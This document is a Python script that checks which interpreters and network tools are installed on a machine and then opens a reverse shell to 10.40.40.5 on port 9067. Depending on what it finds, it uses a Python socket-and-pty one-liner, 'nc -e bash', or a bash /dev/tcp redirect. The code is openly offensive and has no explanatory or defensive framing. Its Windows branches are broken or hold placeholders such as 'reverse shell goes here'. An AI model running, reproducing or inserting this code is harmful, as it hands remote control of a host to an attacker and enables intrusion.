import subprocess
import os
import sys
import shutil
import platform

def detect_os():
    return platform.system()

def check_available_tools(tools):
    found = {}
    for tool in tools:
        path = shutil.which(tool)
        if path:
            found[tool] = path
    return found

def run_bash(cmd):
    return subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).communicate()

def run_powershell(cmd):
    return subprocess.Popen(["powershell", "-Command", cmd], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).communicate()

def choice(tool_info):
    if "python3" in tool_info:
        print("Python 3 is available.")
        if detect_os() == "Windows":
            out, err = run_powershell("hello windwos.py")
        else:
            out, err = run_bash('export RHOST="10.40.40.5"; export RPORT=9067; python3 -c \'import sys,socket,os,pty; s=socket.socket(); s.connect((os.getenv("RHOST"), int(os.getenv("RPORT")))); [os.dup2(s.fileno(), fd) for fd in (0,1,2)]; pty.spawn("bash")\'')
    elif "python" in tool_info:
        print("Python is available.")
        if detect_os() == "Windows":
            out, err = run_powershell("hello windwos.py")
        else:
            out, err = run_bash('export RHOST="10.40.40.5"; export RPORT=9067; python -c \'import sys,socket,os,pty; s=socket.socket(); s.connect((os.getenv("RHOST"), int(os.getenv("RPORT")))); [os.dup2(s.fileno(), fd) for fd in (0,1,2)]; pty.spawn("bash")\'')
    elif "nc" in tool_info:
        print("Ncat is available.")
        if detect_os() == "Windows":
            out, err = run_powershell("nc.exe 10.40.40.5 9067 -e bash")
        else:
            out, err = run_bash("nc 10.40.40.5 9067 -e bash")
    elif "bash" in tool_info:
        print("Bash is available.")
        if detect_os() == "Windows":
            out, err = run_powershell("bash -i >& /dev/tcp/10.40.40.5/9067 0>&1")
        else:
            out, err = run_bash("bash -i >& /dev/tcp/10.40.40.5/9067 0>&1")
    elif "sh" in tool_info:
        print("sh is available.")
        if detect_os() == "Windows":
            out, err = run_powershell("reverse shell goes here")
        else:
            out, err = run_bash("reverse shell goes here")
    else:
        print("No common tools found.")

if __name__ == "__main__":
    print(f"OS: {detect_os()}")

    common_tools = ["python3","python", "pip", "git", "curl", "wget", "gcc", "node", "docker","Ncat","nc","bash","sh"]
    tool_info = check_available_tools(common_tools)

    print("Tools found:")
    for tool, path in tool_info.items():
        print(f"  {tool}: {path}")

    choice(tool_info)
